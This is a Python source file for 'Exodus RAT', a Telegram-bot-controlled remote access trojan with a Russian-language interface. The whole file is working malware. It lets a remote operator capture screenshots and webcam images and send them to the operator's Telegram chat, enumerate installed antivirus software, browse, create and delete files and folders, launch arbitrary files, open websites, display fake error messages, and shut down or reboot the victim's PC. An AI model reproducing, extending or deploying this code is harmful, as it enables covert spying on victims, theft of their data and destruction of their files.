from data.modules import *
from config import TOKEN, USER_ID, bot_message, auto_tasks, bot

waiting_for_url = {}
waiting_for_path = {}
creating_folder = {}
removing_folder = {}
waiting_for_error = {}
waiting_for_file_upload  = {}
waiting_for_delete_path = {}
waiting_for_runfile = {}

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(USER_ID, "Привет, это Exodus RAT для телеграмма. напишите /help для получения списка комманд.")

def set_master_volume(level: float):
    pythoncom.CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(level, None)

@bot.message_handler(commands=['help'])
def help(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = [
        KeyboardButton("Cкриншот"),
        KeyboardButton("Веб-Камера"),
        KeyboardButton("АнтиВирусы"),
        KeyboardButton("Окрыть сайт"),
        KeyboardButton("Содержание директории"),
        KeyboardButton("Создать папку"),
        KeyboardButton("Удалить папку"),
        KeyboardButton("FakeError"),
        KeyboardButton("Удалить файл"),
        KeyboardButton("Запустить файл"),
        KeyboardButton("Звук 100%"),
        KeyboardButton("Выключить звук"),
        KeyboardButton("Выключить ПК"),
        KeyboardButton("Перезагрузить ПК"),
        KeyboardButton("ALT+F4"),
        KeyboardButton("Свернуть все")
    ]
    markup.add(*buttons)
    bot.send_message(USER_ID, "снизу есть список комманд", reply_markup=markup)


@bot.message_handler(func=lambda m: m.text == "Звук 100%")
def vol_max(message):
    try:
        set_master_volume(1.0)
        bot.send_message(message.chat.id, "Громкость установлена на 100%")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка установки громкости: {e}")

@bot.message_handler(func=lambda m: m.text == "Выключить звук")
def vol_mute(message):
    try:
        set_master_volume(0.0)
        bot.send_message(message.chat.id, "Звук отключён")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка отключения звука: {e}")

@bot.message_handler(func=lambda m: m.text == "Выключить ПК")
def shutdown_pc(message):
    bot.send_message(message.chat.id, "Выключаю ПК...")
    os.system("shutdown /s /t 0")

@bot.message_handler(func=lambda m: m.text == "Перезагрузить ПК")
def reboot_pc(message):
    bot.send_message(message.chat.id, "Перезагружаюсь...")
    os.system("shutdown /r /t 0")

@bot.message_handler(func=lambda m: m.text == "ALT+F4")
def alt_f4(message):
    bot.send_message(message.chat.id, "Выполняю ALT+F4...")
    pyautogui.hotkey('alt', 'f4')

@bot.message_handler(func=lambda m: m.text == "Свернуть все")
def minimize_all(message):
    bot.send_message(message.chat.id, "Сворачиваю все окна...")
    pyautogui.hotkey('win', 'd')

@bot.message_handler(func=lambda m: m.text == "АнтиВирусы")
def antivirus_list(message):
    antivirus_list = []
    try:
        reg_keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]

        for key in reg_keys:
            try:
                reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                for i in range(0, winreg.QueryInfoKey(reg)[0]):
                    subkey_name = winreg.EnumKey(reg, i)
                    subkey = winreg.OpenKey(reg, subkey_name)

                    try:
                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                        if "antivirus" in display_name.lower():
                            antivirus_list.append(display_name)
                    except FileNotFoundError:
                        continue

            except FileNotFoundError:
                continue
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
        return

    if antivirus_list:
        av_text = "\n".join(antivirus_list)
        bot.send_message(message.chat.id, f"Установленные антивирусы:\n{av_text}")
    else:
        bot.send_message(message.chat.id, "Не удалось найти установленные антивирусы")


@bot.message_handler(func=lambda message: message.text == "Cкриншот")
def screenshot(message):
    bot.send_message(USER_ID, "Это может занять некоторое время...")

    temp_dir = "s"
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    file_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")

    try:
        screenshot_image = pyautogui.screenshot()
        screenshot_image.save(file_path)

        with open(file_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
    
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при создании скриншота: {e}")
    
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)
            os.remove(temp_dir)


@bot.message_handler(func=lambda message: message.text == "Веб-Камера")
def web(message):
    bot.send_message(USER_ID, "Это может занять некоторое время...")
    temp_dir = "s"
    os.makedirs(temp_dir, exist_ok=True)
    path = os.path.join(temp_dir, f"webcam_{int(time.time())}.png")

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        bot.send_message(message.chat.id, "Не удалось открыть веб-камеру.")
        return

    ret, frame = cap.read()
    cap.release()
    if not ret:
        bot.send_message(message.chat.id, "Не удалось получить кадр с веб-камеры.")
        return

    cv2.imwrite(path, frame)
    with open(path, 'rb') as f:
        bot.send_photo(message.chat.id, f)
    os.remove(path)
    os.remove(temp_dir)

@bot.message_handler(func=lambda message: message.text == "Окрыть сайт")
def site(message):
	waiting_for_url[message.chat.id] = True
	bot.send_message(USER_ID, "Отправьте ссылку")

@bot.message_handler(func=lambda message: waiting_for_url.get(message.chat.id, False))
def open_url(message):
    url = message.text.strip()

    # Очищаем флаг
    waiting_for_url[message.chat.id] = False

    # Проверка и открытие
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    try:
        webbrowser.open(url)
        bot.send_message(message.chat.id, f"Сайт открыт в браузере.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при попытке открыть сайт: {e}")

@bot.message_handler(func=lambda m: m.text == "Содержание директории")
def askpath(message):
    waiting_for_path[USER_ID] = True
    bot.send_message(USER_ID, "Введите путь к директории, содержимое которой хотите получить:")

@bot.message_handler(func=lambda message: waiting_for_path.get(message.chat.id, False))
def directory_path(message):
    path = message.text.strip()

    waiting_for_path.pop(message.chat.id, None)

    if not os.path.exists(path):
        bot.send_message(message.chat.id, "❌ Директория не найдена.")
        return

    if not os.path.isdir(path):
        bot.send_message(message.chat.id, "❗ Указанный путь не является директорией.")
        return

    files = os.listdir(path)
    if not files:
        bot.send_message(message.chat.id, "📂 Папка пуста.")
        return

    reply = f"📁 Содержимое директории:\n\n"
    for item in files:
        full_path = os.path.join(path, item)
        if os.path.isdir(full_path):
            reply += f"📁 {item}/\n"
        else:
            reply += f"📄 {item}\n"

    max_len = 4000
    for i in range(0, len(reply), max_len):
        bot.send_message(message.chat.id, reply[i:i+max_len])


@bot.message_handler(func=lambda m: m.text == "Создать папку")
def askname(message):
    creating_folder[USER_ID] = True
    bot.send_message(USER_ID, "Введите путь и имя новой папки, например:\n`C:/Users/User/Desktop/NewFolder`", parse_mode="Markdown")

@bot.message_handler(func=lambda message: creating_folder.get(message.chat.id, False))
def create_folder(message):
    path = message.text.strip()
    creating_folder.pop(message.chat.id, None)

    try:
        os.makedirs(path, exist_ok=False)
        bot.send_message(message.chat.id, f"✅ Папка успешно создана:\n`{path}`", parse_mode="Markdown")
    except FileExistsError:
        bot.send_message(message.chat.id, "⚠️ Такая папка уже существует.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка при создании папки:\n`{e}`", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "Удалить папку")
def ask_folder_to_delete(message):
    removing_folder[USER_ID] = True
    bot.send_message(USER_ID, "Введите полный путь к папке, которую нужно удалить:")

@bot.message_handler(func=lambda message: removing_folder.get(message.chat.id, False))
def remove_folder(message):
    folder_path = message.text.strip()
    removing_folder.pop(message.chat.id, None)

    try:
        if os.path.exists(folder_path) and os.path.isdir(folder_path):
            os.rmdir(folder_path)
            bot.send_message(message.chat.id, f"✅ Папка удалена:\n`{folder_path}`", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, "❌ Папка не найдена или это не папка.")
    except OSError as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка при удалении:\n`{e}`", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "FakeError")
def askerror(message):
    waiting_for_error[USER_ID] = True
    bot.send_message(USER_ID, "Введите текст фейковой ошибки, которую хотите сгенерировать:")

@bot.message_handler(func=lambda message: waiting_for_error.get(message.chat.id, False))
def show_FakeError(message):
    error_text = message.text.strip()

    ctypes.windll.user32.MessageBoxW(0, error_text, "Ошибка", 0x10)  # MB_ICONERROR

    waiting_for_error[message.chat.id] = False

    bot.send_message(message.chat.id, "Фейковая ошибка показана.")

@bot.message_handler(func=lambda message: message.text == "Удалить файл")
def delete_file_prompt(message):
    waiting_for_delete_path[USER_ID] = True
    bot.send_message(USER_ID, "Введите путь к файлу, который нужно удалить:")

@bot.message_handler(func=lambda message: waiting_for_delete_path.get(message.chat.id, False))
def delete_file_path(message):
    path = message.text.strip()

    try:
        if os.path.exists(path) and os.path.isfile(path):
            os.remove(path)
            bot.send_message(message.chat.id, "Файл успешно удалён.")
        else:
            bot.send_message(message.chat.id, "Файл не найден.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при удалении файла: {e}")
    finally:
        waiting_for_delete_path[message.chat.id] = False

@bot.message_handler(func=lambda message: message.text == "Запустить файл")
def prompt_run_file(message):
    waiting_for_runfile[USER_ID] = True
    bot.send_message(USER_ID, "Введите полный путь к файлу, который нужно запустить:")

@bot.message_handler(func=lambda message: waiting_for_runfile.get(message.chat.id, False))
def run_file(message):
    path = message.text.strip()
    waiting_for_runfile.pop(message.chat.id, None)

    if not os.path.exists(path):
        bot.send_message(message.chat.id, "❌ Файл не найден. Проверьте путь.")
        return
    if not os.path.isfile(path):
        bot.send_message(message.chat.id, "❗ Это не файл.")
        return

    try:
        if os.name == 'nt':
            os.startfile(path)
        else:
            subprocess.Popen(['xdg-open', path])
        bot.send_message(message.chat.id, f"✅ Файл запущен:\n`{path}`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка при запуске файла:\n`{e}`", parse_mode="Markdown")

if __name__ == '__main__':
    bot.polling(none_stop=True)